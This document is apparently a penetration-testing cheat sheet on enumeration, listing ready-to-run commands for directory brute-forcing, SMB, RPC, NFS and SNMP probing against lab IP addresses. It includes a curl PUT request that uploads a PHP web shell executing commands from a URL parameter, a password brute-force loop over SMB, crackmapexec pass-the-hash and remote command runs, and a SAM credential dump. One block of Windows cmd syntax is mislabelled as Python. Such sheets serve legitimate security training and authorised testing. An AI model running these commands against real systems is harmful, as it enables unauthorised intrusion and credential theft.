---
title: Enumeration
excerpt: "This is a guide for enumeration"
last_modified_at: 13-01-2022
categories:
- cheatsheet
tags:  
- pentest
- methodologies
- recon
- enumeration
---

# Enumeration  

## Brute force directory/pages/files
```bash
gobuster dir -e -u 172.16.1.10/ -w /usr/share/wordlists/dirb/big.txt -s "200,301,302,401" .

gobuster dir -e -u http://172.16.1.10/turismo -w /usr/share/wordlists/dirb/small.txt -x .php,.txt,.sql,.bkp  #Search by extensions.

gobuster dir -e -u 192.168.0.7 -w wordlist -x .php -c cookie # Pass cookie
```  

Another tools:
* Dirsearch
* Dirb
* Dirbusters  

File extensions to search:
    - Web :.pl,.cgi,.sh,.php,.jsp,.asp,.aspx,.js,.html,.nm
    - Backups:.bkp,.bak,.sql
    - Files:.pdf,.txt,.conf,.xml  

Robots.txt/sitemap.xml are importants file that contains directories that are not indexed.

## Methods allowed
```bash
curl -v -X OPTIONS http://172.16.1.10/ # Will show all methods
```  

Put method
```bash
curl -v -X PUT -d "<?php system(\$_GET["cmd"]); ?>" http://172.16.1.10/webdav/shell.php
```  

## FTP
Commons credentials:
* User:anonymous, pass:anonymous  


## SMB
Permit share directories and files. Port 139 -> NetBIOS, port 445 -> SMB over TCP
Links:  
* [Hacktricks SMB](https://book.hacktricks.xyz/pentesting/pentesting-smb)

### Windows
```bash
nbtstat -A 172.16.1.4 # show name, group, etc...

net view \\172.16.1.5 # Try to connect

net view \\172.16.1.5 "" u:"" # Null session logon

net use h: \\172.16.1.5\opt # Mount the folder in h:

nbtstat -c # Cache of all old connections
```  
```python
#Python brute force
for /f %i in (passwords.txt) do net use \\172.16.1.4 %i /u:john
```  

### Linux
```bash
nbtscan -r 172.16.1.0/24 # Search in range

smbclient  -L \\172.16.1.5 -N # Connect in anonymous mode

smbclient   //172.16.1.5/_DOCS -N # Connect in a directory

smbclient  -L \\172.16.1.5 -N —option='client min protocol=NT1' # Sometimes can have a version incompatibility with older versions

crackmapexec smb 192.168.10.11 -u Administrator -H <NTHASH> -x whoami #Pass-the-Hash
crackmapexec smb 192.168.10.11 -u Administrator -p 'password' -x whoami #Execute cmd
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sam #Dump SAM
```  
Automatic enumeration : [enum4linux](https://github.com/CiscoCXSecurity/enum4linux)
```bash
enum4linux -U 172.16.1.5 # Without users

enum4linux -a 172.16.1.5 # All
```  
## RPC Remote proccedure call
API to call commands in another machines.  
```bash
rpcclient -U "" -N 172.16.1.5 # Anonymous login
# After connect
enumdomusers # Enumerate users
queryuser jonh
```  
## NFS Network file system 
Protocol to share files. Port 2049
```bash
rpcinfo -p 172.16.1.5 | grep nfs # Check versions

showmount -e 172.16.1.5 # Show shared

mount -t nfs -o nfsverscat=2 172.16.1.5:/ /tmp/nfs #Mount the nfs
```  

## SNMP Simple Network Management protocol
Protocol used to monitor different devices in the network (like routers, switches, printers, IoTs...). Ports: 161,162,10161,10162/UDP
Links:  
* [Hacktricks snmp](https://book.hacktricks.xyz/pentesting/pentesting-snmp)
* [objectid list](https://www.alvestrand.no/objectid/1.3.6.1.2)

```bash
onesixtyone -c comu.txt 172.16.1.0/24 # Search by open hosts with communities

snmpwalk -c public -v1 172.16.1.4 1.3.6.1.4.1.77.1.2.25  # Search with public community and specific code

snmp-check 172.16.1.4 -c public # Show info of host
```  

## WAF Web application firewall

```bash
WAFW00F google.com
```